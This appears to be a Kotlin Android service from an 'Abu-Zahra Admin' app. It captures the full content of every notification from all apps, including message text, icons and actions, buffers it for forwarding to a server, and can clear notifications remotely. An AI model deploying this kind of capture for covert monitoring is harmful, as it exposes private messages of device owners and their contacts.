package com.abuzahra.manager.service

import android.content.Intent
import android.os.Build
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.graphics.Bitmap
import android.util.Base64
import java.io.ByteArrayOutputStream
import com.abuzahra.manager.EventBuffer
import kotlinx.coroutines.Dispatchers

/**
 * Notification Listener Service for Abu-Zahra Admin
 * Captures and forwards all notifications to the server
 */
class MyNotificationListenerService : NotificationListenerService() {

    companion object {
        private var instance: MyNotificationListenerService? = null

        fun getInstance(): MyNotificationListenerService? = instance

        fun isEnabled(context: android.content.Context): Boolean {
            val enabledListeners = android.provider.Settings.Secure.getString(
                context.contentResolver,
                "enabled_notification_listeners"
            ) ?: return false

            val serviceName = "${context.packageName}/${MyNotificationListenerService::class.java.canonicalName}"
            return enabledListeners.contains(serviceName) || enabledListeners.contains(context.packageName)
        }
    }

    override fun onListenerConnected() {
        super.onListenerConnected()
        instance = this

        // Buffer notification listener connected event locally
        EventBuffer.addEvent(
            "notification_listener_enabled",
            mapOf("status" to "connected")
        )
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        sbn ?: return

        try {
            val notification = sbn.notification
            val extras = notification.extras

            // Extract notification data
            val packageName = sbn.packageName
            val title = extras.getCharSequence(android.app.Notification.EXTRA_TITLE)?.toString() ?: ""
            val text = extras.getCharSequence(android.app.Notification.EXTRA_TEXT)?.toString() ?: ""
            val bigText = extras.getCharSequence(android.app.Notification.EXTRA_BIG_TEXT)?.toString() ?: ""
            val subText = extras.getCharSequence(android.app.Notification.EXTRA_SUB_TEXT)?.toString() ?: ""
            val infoText = extras.getCharSequence(android.app.Notification.EXTRA_INFO_TEXT)?.toString() ?: ""
            val summaryText = extras.getCharSequence(android.app.Notification.EXTRA_SUMMARY_TEXT)?.toString() ?: ""

            // Get post time
            val postTime = sbn.postTime
            val id = sbn.id
            val tag = sbn.tag ?: ""
            val key = sbn.key

            // Get notification category
            val category = notification.category ?: ""

            // Get priority
            val priority = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                notification.extras?.getInt("priority", notification.priority) ?: notification.priority
            } else {
                @Suppress("DEPRECATION")
                notification.priority
            }

            // Get large icon if available
            var largeIconBase64: String? = null
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val largeIcon = extras.getParcelable<android.graphics.drawable.Icon>(android.app.Notification.EXTRA_LARGE_ICON)
                if (largeIcon != null) {
                    // Convert icon to base64
                    largeIconBase64 = iconToBase64(largeIcon)
                }
            }

            // Get small icon
            var smallIconResId = 0
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                smallIconResId = notification.smallIcon?.resId ?: 0
            }

            // Build notification data
            val notificationData = mutableMapOf<String, Any?>(
                "package" to packageName,
                "title" to title,
                "text" to text,
                "big_text" to bigText,
                "sub_text" to subText,
                "info_text" to infoText,
                "summary_text" to summaryText,
                "post_time" to postTime,
                "id" to id,
                "tag" to tag,
                "key" to key,
                "category" to category,
                "priority" to priority,
                "small_icon_res" to smallIconResId,
                "large_icon" to largeIconBase64,
                "is_ongoing" to sbn.isOngoing,
                "is_clearable" to sbn.isClearable,
                "has_progress" to (notification.extras.getInt(android.app.Notification.EXTRA_PROGRESS) > 0)
            )

            // Get progress info if available
            val progress = notification.extras.getInt(android.app.Notification.EXTRA_PROGRESS, 0)
            val progressMax = notification.extras.getInt(android.app.Notification.EXTRA_PROGRESS_MAX, 0)
            if (progressMax > 0) {
                notificationData["progress"] = progress
                notificationData["progress_max"] = progressMax
            }

            // Get actions if available
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT_WATCH) {
                val actions = notification.actions
                if (actions != null && actions.isNotEmpty()) {
                    val actionList = actions.mapIndexed { index, action ->
                        mapOf(
                            "index" to index,
                            "title" to (action.title?.toString() ?: ""),
                            "package" to (action.actionIntent?.targetPackage ?: "")
                        )
                    }
                    notificationData["actions"] = actionList
                }
            }

            // Buffer notification event locally (not sent automatically)
            EventBuffer.addEvent("notification", notificationData)

        } catch (e: Exception) {
            // Log error but don't crash
            android.util.Log.w("NotificationListener", "Error processing notification", e)
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {
        sbn ?: return

        // Buffer removal event locally
        EventBuffer.addEvent(
            "notification_removed",
            mapOf(
                "package" to (sbn.packageName ?: ""),
                "key" to (sbn.key ?: ""),
                "id" to sbn.id
            )
        )
    }

    override fun onListenerDisconnected() {
        super.onListenerDisconnected()
        instance = null
    }

    private fun sendNotification(data: Map<String, Any?>) {
        // Now handled by EventBuffer - events are buffered locally
        // Kept for compatibility but events are already buffered in onNotificationPosted
    }

    private fun iconToBase64(icon: android.graphics.drawable.Icon): String? {
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val drawable = icon.loadDrawable(this)
                if (drawable != null) {
                    val width = drawable.intrinsicWidth.coerceAtLeast(1)
                    val height = drawable.intrinsicHeight.coerceAtLeast(1)
                    val bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888)
                    val canvas = android.graphics.Canvas(bitmap)
                    drawable.setBounds(0, 0, canvas.width, canvas.height)
                    drawable.draw(canvas)
                    val stream = ByteArrayOutputStream()
                    bitmap.compress(Bitmap.CompressFormat.PNG, 70, stream)
                    bitmap.recycle()
                    Base64.encodeToString(stream.toByteArray(), Base64.DEFAULT)
                } else {
                    null
                }
            } else {
                null
            }
        } catch (e: Exception) {
            android.util.Log.w("NotificationListener", "iconToBase64 failed", e)
            null
        }
    }

    /**
     * Clear all notifications
     */
    fun clearAllNotifications() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            cancelAllNotifications()
        }
    }

    /**
     * Clear notification by key
     */
    fun clearNotification(key: String) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            cancelNotification(key)
        }
    }

    /**
     * Get all active notifications
     */
    fun getAllNotifications(): List<StatusBarNotification> {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            activeNotifications?.toList() ?: emptyList()
        } else {
            emptyList()
        }
    }
}
